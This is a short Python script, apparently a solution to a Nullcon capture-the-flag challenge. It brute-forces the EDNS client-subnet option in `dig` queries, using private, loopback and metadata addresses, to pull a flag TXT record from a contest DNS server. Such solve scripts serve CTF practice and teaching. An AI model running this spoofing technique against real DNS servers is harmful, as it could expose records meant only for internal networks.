#!/usr/bin/env python3
import subprocess
import sys
import threading

SERVER = "52.59.124.14"
PORT = "5053"
DOMAIN = "flag.ctf.nullcon.net"

subnets = [
    "127.0.0.1", "0.0.0.0", "10.0.0.0", "10.0.0.1", "10.1.1.1", 
    "192.168.0.0", "192.168.0.1", "192.168.1.1", "172.16.0.0", "172.16.0.1",
    "172.17.0.1", "172.18.0.1", "172.19.0.1", "172.20.0.1", "172.21.0.1", "172.22.0.1",
    "172.23.0.1", "172.24.0.1", "172.25.0.1", "172.26.0.1", "172.27.0.1", "172.28.0.1",
    "172.29.0.1", "172.30.0.1", "172.31.0.1",
    "169.254.169.254", # Metadata service
    "::1", # IPv6 localhost
    "fc00::1", # Unique local
]

for i in range(256):
    subnets.append(f"192.168.{i}.1")
    subnets.append(f"10.0.{i}.1")

def check_subnet(subnet):
    cmd = ["dig", f"@{SERVER}", "-p", PORT, "+short", "TXT", DOMAIN, f"+subnet={subnet}"]
    try:
        output = subprocess.check_output(cmd, timeout=3).decode('utf-8').strip()
        if output and "FAKEFLAG" not in output:
            print(f"!!! FOUND with {subnet}: {output}")
            return True
        elif output:
            # print(f"{subnet} -> {output}")
            pass
    except:
        pass
    return False

def worker(subnets):
    for s in subnets:
        if check_subnet(s):
            break

# Threading
threads = []
chunk_size = len(subnets) // 10
for i in range(10):
    start = i * chunk_size
    end = start + chunk_size if i < 9 else len(subnets)
    t = threading.Thread(target=worker, args=(subnets[start:end],))
    t.start()
    threads.append(t)

for t in threads:
    t.join()
